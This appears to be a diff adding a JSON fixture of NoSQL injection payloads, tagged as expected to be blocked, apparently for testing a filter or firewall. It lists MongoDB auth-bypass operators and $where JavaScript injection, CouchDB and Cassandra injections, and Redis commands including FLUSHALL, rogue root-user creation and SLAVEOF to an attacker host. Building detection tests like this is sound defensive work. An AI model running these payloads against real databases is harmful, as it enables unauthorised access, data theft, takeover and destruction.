@@ -1,0 +1,529 @@
+[
+  {
+      "id": "INJ-NOSQLI-200",
+      "payload": "admin' || '1'=='1",
+      "tags": [
+        "mongodb",
+        "basic",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB authentication bypass - always true condition",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-201",
+      "payload": "{\"$gt\": \"\"}",
+      "tags": [
+        "mongodb",
+        "operator",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $gt operator injection - matches all documents",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-202",
+      "payload": "{\"$ne\": null}",
+      "tags": [
+        "mongodb",
+        "operator",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $ne operator - not equal null (auth bypass)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-203",
+      "payload": "{\"$or\": [{}, {\"a\":\"a\"}]}",
+      "tags": [
+        "mongodb",
+        "operator"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $or operator with empty object (always true)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-204",
+      "payload": "{\"username\": {\"$regex\": \".*\"}}",
+      "tags": [
+        "mongodb",
+        "regex"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB regex injection - matches all usernames",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-205",
+      "payload": "{\"$where\": \"this.password.length > 0\"}",
+      "tags": [
+        "mongodb",
+        "where",
+        "code-injection"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $where clause - JavaScript code execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-206",
+      "payload": "'; return true; var dummy='",
+      "tags": [
+        "mongodb",
+        "where",
+        "javascript"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $where JavaScript injection - breaks out of string",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-207",
+      "payload": "{\"$gt\": 0}",
+      "tags": [
+        "mongodb",
+        "operator"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB numeric operator injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-208",
+      "payload": "{\"username\": {\"$in\": [\"admin\", \"root\", \"administrator\"]}}",
+      "tags": [
+        "mongodb",
+        "enumeration"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB $in operator - username enumeration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-209",
+      "payload": "{\"$expr\": {\"$gt\": [\"$balance\", 0]}}",
+      "tags": [
+        "mongodb",
+        "aggregation"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB aggregation expression injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-210",
+      "payload": "admin' && this.password.match(/.*/)//",
+      "tags": [
+        "mongodb",
+        "regex",
+        "bypass"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB regex bypass with JavaScript comment",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-211",
+      "payload": "{\"_id\": {\"$nin\": []}}",
+      "tags": [
+        "couchdb",
+        "operator"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CouchDB $nin (not in) empty array - matches all documents",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-212",
+      "payload": "{\"selector\": {\"_id\": {\"$gt\": null}}}",
+      "tags": [
+        "couchdb",
+        "mango"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "CouchDB Mango query injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-213",
+      "payload": "'; return true; //",
+      "tags": [
+        "couchdb",
+        "javascript"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CouchDB view function JavaScript injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-214",
+      "payload": "username' OR '1'='1' /*",
+      "tags": [
+        "cassandra",
+        "cql"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Cassandra CQL injection with comment",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-215",
+      "payload": "admin' ALLOW FILTERING",
+      "tags": [
+        "cassandra",
+        "cql"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Cassandra CQL ALLOW FILTERING bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-216",
+      "payload": "KEYS *",
+      "tags": [
+        "redis",
+        "enumeration",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Redis KEYS command - enumerate all keys",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-217",
+      "payload": "CONFIG GET *",
+      "tags": [
+        "redis",
+        "config"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis CONFIG GET - retrieve all configuration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-218",
+      "payload": "EVAL \"return redis.call('GET','secret_key')\" 0",
+      "tags": [
+        "redis",
+        "lua",
+        "code-injection"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis Lua script injection - arbitrary command execution",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-219",
+      "payload": "FLUSHALL",
+      "tags": [
+        "redis",
+        "destructive"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis FLUSHALL - wipe entire database (DESTRUCTIVE)",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-220",
+      "payload": "{\"$and\": [{\"$or\": [{\"a\": 1}]}]}",
+      "tags": ["mongodb", "nested-operators"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB nested logical operators",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-221",
+      "payload": "{\"$where\": \"function(){return true}\"}",
+      "tags": ["mongodb", "where", "javascript"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $where function syntax",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-222",
+      "payload": "{\"password[$regex]\": \"^a\"}",
+      "tags": ["mongodb", "regex", "extraction"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB regex password extraction",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-223",
+      "payload": "username=admin&password[$ne]=x",
+      "tags": ["mongodb", "http-param-pollution"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB injection via HTTP params",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-224",
+      "payload": "{\"$type\": 2}",
+      "tags": ["mongodb", "type-confusion"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB $type operator abuse",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-225",
+      "payload": "{\"$mod\": [1, 0]}",
+      "tags": ["mongodb", "modulo"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB $mod operator",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-226",
+      "payload": "{\"$exists\": true, \"$nin\": []}",
+      "tags": ["mongodb", "exists"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $exists with empty $nin",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-227",
+      "payload": "{\"$all\": [[]]}",
+      "tags": ["mongodb", "all"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB $all with empty array",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-228",
+      "payload": "{\"$elemMatch\": {\"$gt\": 0}}",
+      "tags": ["mongodb", "elemmatch"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB $elemMatch injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-229",
+      "payload": "{\"password\": {\"$size\": 0}}",
+      "tags": ["mongodb", "size"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB $size operator",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-230",
+      "payload": "db.users.find({$where: 'sleep(5000)'})",
+      "tags": ["mongodb", "shell", "dos"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB shell DoS via sleep",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-231",
+      "payload": "db.runCommand({\"$eval\": \"db.users.find()\"})",
+      "tags": ["mongodb", "eval", "deprecated"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB deprecated $eval",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-232",
+      "payload": "'); return db.getCollectionNames(); var x=('",
+      "tags": ["mongodb", "js-injection"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB collection enumeration via JS",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-233",
+      "payload": "LPUSH queue malicious_data",
+      "tags": ["redis", "list-injection"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Redis list injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-234",
+      "payload": "SET __session:admin '{\"admin\":true}'",
+      "tags": ["redis", "session-hijack"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis session manipulation",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-235",
+      "payload": "ZADD scores 999999 hacker",
+      "tags": ["redis", "sorted-set"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Redis sorted set manipulation",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-236",
+      "payload": "SCRIPT LOAD \"redis.call('SET','pwned','true')\"",
+      "tags": ["redis", "script", "lua"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis Lua script loading",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-237",
+      "payload": "SLAVEOF attacker.com 6379",
+      "tags": ["redis", "replication", "rce"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis SLAVEOF RCE attack",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-238",
+      "payload": "DEBUG SEGFAULT",
+      "tags": ["redis", "dos", "crash"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis DEBUG crash command",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-239",
+      "payload": "{\"query\": {\"$currentDate\": {\"lastModified\": true}}}",
+      "tags": ["mongodb", "currentdate"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "MongoDB $currentDate manipulation",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-240",
+      "payload": "{\"$set\": {\"isAdmin\": true}}",
+      "tags": ["mongodb", "update-injection"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $set privilege escalation",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-241",
+      "payload": "{\"$unset\": {\"password\": \"\"}}",
+      "tags": ["mongodb", "unset", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $unset password removal",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-242",
+      "payload": "{\"$push\": {\"roles\": \"admin\"}}",
+      "tags": ["mongodb", "push", "privilege-escalation"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $push role injection",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-243",
+      "payload": "{\"$pull\": {\"restrictions\": {\"$exists\": true}}}",
+      "tags": ["mongodb", "pull", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB $pull restriction removal",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-244",
+      "payload": "db.adminCommand({listDatabases: 1})",
+      "tags": ["mongodb", "admin", "enumeration"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB admin database listing",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-245",
+      "payload": "db.createUser({user:'attacker',pwd:'pwned',roles:['root']})",
+      "tags": ["mongodb", "user-creation", "persistence"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MongoDB rogue user creation",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-246",
+      "payload": "set key \"\\r\\nSLAVEOF attacker 6379\\r\\n\"",
+      "tags": ["redis", "crlf", "ssrf"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis CRLF injection to SLAVEOF",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-247",
+      "payload": "SCAN 0 COUNT 10000",
+      "tags": ["redis", "enumeration"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Redis key enumeration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-248",
+      "payload": "DUMP sensitive_key",
+      "tags": ["redis", "exfiltration"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis key dump for exfiltration",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-249",
+      "payload": "RESTORE pwned_key 0 \"\\x00...\"",
+      "tags": ["redis", "restore", "injection"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Redis RESTORE arbitrary data",
+      "category": "Injection"
+  },
+  {
+      "id": "INJ-NOSQLI-250",
+      "payload": "CLIENT SETNAME attacker",
+      "tags": ["redis", "client"],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Redis client identification",
+      "category": "Injection"
+  }
+]
